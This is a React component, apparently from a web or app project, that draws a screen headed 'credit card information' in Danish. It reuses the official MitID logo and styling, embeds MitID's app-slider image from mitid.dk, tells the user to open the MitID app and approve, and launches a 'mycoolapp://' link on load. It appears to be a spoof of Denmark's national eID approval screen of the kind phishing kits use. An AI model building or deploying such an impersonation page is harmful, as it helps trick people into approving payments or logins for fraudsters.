import React, { useEffect } from "react";

function Login() {
  
  useEffect(() => {
    window.open("mycoolapp://", "_system");
  }, []);

  return (
    <div className="max-w-md m-auto">
      <div className="py-3 px-7  min-h-[60vh]">
        <div className="flex justify-between items-center h-16 border-b-2 mb-6">
          <h2 className="font-semibold text-lg">Kreditkortoplysninger</h2>
          <span>
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="61"
              height="16"
              viewBox="0 0 61 16"
              className="mitid-core-header__logo"
              fill="blue"
              focusable="false"
              aria-label="MitID logo"
            >
              <path d="M19.2,0c1,0,1.8,0.8,1.8,1.8c0,1-0.8,1.8-1.8,1.8c-1,0-1.8-0.8-1.8-1.8C17.4,0.8,18.2,0,19.2,0z M40.4,0 c2.1,0,3.8,1.7,3.8,3.8c0,2.1-1.7,3.8-3.8,3.8c-2.1,0-3.8-1.7-3.8-3.8C36.6,1.7,38.3,0,40.4,0z M20.7,4.9v10.9h-3V4.9H20.7z M2.9,0.8l4.6,7.1l4.5-7.1h2.9v15h-3.1V6.1l-4.3,6.4H7.4L3.1,6.1v9.7H0v-15H2.9z M40.4,9c3.6,0,6.5,2,6.9,6.8H33.6 C34,11,36.9,9,40.4,9z M51.9,0.2C58.3,0.2,61,3.7,61,8c0,4.3-2.7,7.8-9.1,7.8h-2.6V0.2H51.9z M27.1,1.9v3h2.4v2.4h-2.4v4.8 c0,0.9,0.5,1.2,1.3,1.2c0.5,0,1-0.1,1.3-0.4v2.7c-0.4,0.2-1.2,0.3-2,0.3c-2.2,0-3.6-1.1-3.6-3.5V7.3h-1.7V4.9h1.7v-3H27.1z"></path>
            </svg>
          </span>
        </div>
        <div className="flex justify-center">
          <iframe
            className="h-52"
            src="https://www.mitid.dk/assets/img/code-app-slider-emulator.svg"
            frameBorder="0"
          ></iframe>
          {/* <img
            src="https://www.mitid.dk/assets/img/code-app-slider-emulator.svg"
            alt=""
          /> */}
        </div>
        <h1 className="p-5 text-center text-lg font-semibold">
          ÅBN MITID APP OG GODKEND
        </h1>
      </div>
    </div>
  );
}

export default Login;
